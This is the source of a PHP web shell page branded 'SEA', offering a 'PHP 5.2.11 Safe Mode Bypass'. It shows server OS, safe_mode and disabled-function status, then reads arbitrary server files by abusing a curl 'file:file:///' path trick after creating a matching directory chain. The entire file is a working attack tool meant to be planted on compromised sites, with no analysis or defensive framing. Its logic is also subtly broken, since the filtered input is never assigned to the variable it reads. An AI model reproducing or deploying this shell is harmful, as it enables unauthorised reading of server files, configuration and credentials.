
<html>
<head>
<title>SEA | 5.2.11 Safe Mode Bypass .</title>
<link rel="shortcut icon" href='http://sea.sy/style/css/images/sea_en.png' />
<meta http-equiv=Content-Type content=text/html; charset=UTF-8>
<style type="text/css">

.neon{
	color:blue;
	text-shadow: 0 0 5px red,0 0 10px red, 0 0 30px orange, 0 0 45px yellow, 0 0 60px red;
	}
.neon2{
	font-size:15px;
	color:lime;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.neon3{
	color:yellow;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.hacking{
	position:absolute;
	left:50px; font-size:35px;
	}
.like{
	border:4px double yellow;
	box-shadow:0px 2px 20px white;
	border-radius:10px;
	padding:9px;
	height:310px;}
	img{border:4px double yellow;
	box-shadow:0px 9px 15px white;
	border-radius:10px;
	opacity:0.75;
	-moz-opacity: 0.75;
	filter: alpha(opacity=75);
	}
a {
	text-decoration:none;}

</style>
<style>

@-webkit-keyframes tremer {
	0% {-webkit-transform: rotate(3deg);}
	50% {-webkit-transform: rotate(-3deg);}
	100% {-webkit-transform: rotate(3deg);}
	}
img:hover {
	-webkit-animation:tremer 0.2s linear infinite;
	-moz-animation:tremer 0.2s linear infinite;
	-o-animation:tremer 0.2s linear infinite;
	animation:tremer 0.2s linear infinite;
	}
</style>
<?php
$sh3llColor = "#0040FF";
echo CSS($sh3llColor);
?>
</head>
<!-- 5.2.11 Safe Mode Bypass -->
<center>
<p><img src="http://sea.sy/style/css/images/sea_en.png" height="200" width="400" style="height:200px;">																			</a></p>
<form enctype="multipart/form-data" method="POST">
  <table width='576' height='72' border='0' id='Box'>
    <tr><td>OS </td><td width="76%"><?php echo $os; ?></td></tr>
  <tr><td>Safe Mode </td><td width="76%"><?php echo SafeMode(); ?></td></tr>
  <tr><td>Disable Functions </td><td width="76%"><?php echo DisableFunctions(); ?></td></tr>
    <tr><td>PHP Version </td><td width="76%"><?php echo phpversion(); ?></td></tr>
  <tr>
<td width='24%' height='21' style="background:<?php echo $sh3llColor; ?>">5.2.11 Bypass</td>
<td style='padding-left:10px;' > 
  <input name="filePath" type="text" value="<?php echo getcwd(); ?>" size="50" />
  <input name='read' type='submit' id="read" value='Read'></td></tr><tr><td colspan='2'>
  <?php
  if($_POST['read'] && $_POST['filePath'] != '')
  {
	filter($_POST['filePath']);
	$level=0;
	if(!file_exists("file:")){mkdir("file:");}
	chdir("file:");
	$level++;
	
	$hardstyle = explode("/", $file);
	
	for($a=0;$a<count($hardstyle);$a++){
	if(!empty($hardstyle[$a])){
		if(!file_exists($hardstyle[$a])) 
			mkdir($hardstyle[$a]);
		chdir($hardstyle[$a]);
		$level++;
		}
	}
	while($level--){chdir("..");}
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "file:file:///".$file);
	echo '<textarea rows="20" cols="80">';
	if(FALSE==curl_exec($ch))
	echo 'Failed To Read '.htmlspecialchars($file);
	echo ' </textarea>';
	curl_close($ch);
  }
  ?>
</td></tr></table></form>
<!-- End Of 5.2.11 Safe Mode Bypass -->
</center>
<?php
# --------------------------
#   Executer PHP
#---------------------------
function footer()
{
	echo '<table bgcolor="#cccccc" width="100%"><tr>
	<td width="100%">
	<center><font color="gray" size="-2"><b>
	<font color="gray"></font><sy>   [
	</sy><font color="gray"></div><a href="http://www.sea.sy" target="_blank">www.sea.sy</a></font><sy> ]
	</sy></b>
	</td>
	</tr></table>
	</tbody>
	</body></html>
	';
}
function SafeMode()
{
	$safe_mode = ini_get("safe_mode");
	if (!$safe_mode){$safe_mode = '<font color="green">OFF</font>';}
    else {$safe_mode = '<font color="red">ON</font>';}
	return $safe_mode;
}
function DisableFunctions()
{
	$disfun = ini_get('disable_functions');
	if (empty($disfun)){$disfun = '<font color="green">NONE</font>';}return $disfun;
}
function filter($string)
{
	$string = str_replace("//","/",$string);	
	$string = str_replace("\\\\","\\",$string);
	return $string;	
}
function CSS($sh3llColor)
{
	$css =  "
	<style>
	BODY
	{
		FONT-FAMILY: Verdana; 
		margin: 2;
		color: #cccccc;
		background-color: #33363b;
	}
	sy  
	{
		color:".$sh3llColor.";
		font-size:7pt;
		font-weight: bold;
	}
	#Box
	{
	color:".$sh3llColor.";
	font-size:14px;
	background-color:#1C1C1C;
	font-weight:bold;
	width:500px;
	}
	tr 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #ffffff;
	}
	td 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #cccccc;
	}
	table 
	{
	BORDER:  #eeeeee  outset;
	BACKGROUND-COLOR: #1C1C1C;
	color: #cccccc;
	}
	input 
	{
	BORDER-RIGHT:  ".$sh3llColor." 1px solid;
	BORDER-TOP:    ".$sh3llColor." 1px solid;
	BORDER-LEFT:   ".$sh3llColor." 1px solid;
	BORDER-BOTTOM: ".$sh3llColor." 1px solid;
	BACKGROUND-COLOR: #333333;
	font: 9pt tahoma;
	color: #ffffff;
	}
	select 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #000000;
	font: 9pt tahoma;
	color: #CCCCCC;;
	}
	submit 
	{
	BORDER:  1px outset buttonhighlight;
	BACKGROUND-COLOR: #272727;
	width: 40%;
	color: #cccccc;
	}
	textarea 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #333333;
	color: #ffffff;
	}
	A:link {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:visited { COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:active {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:hover {color:blue;TEXT-DECORATION: none}
	</style>";
	return $css;
}
footer();
?>
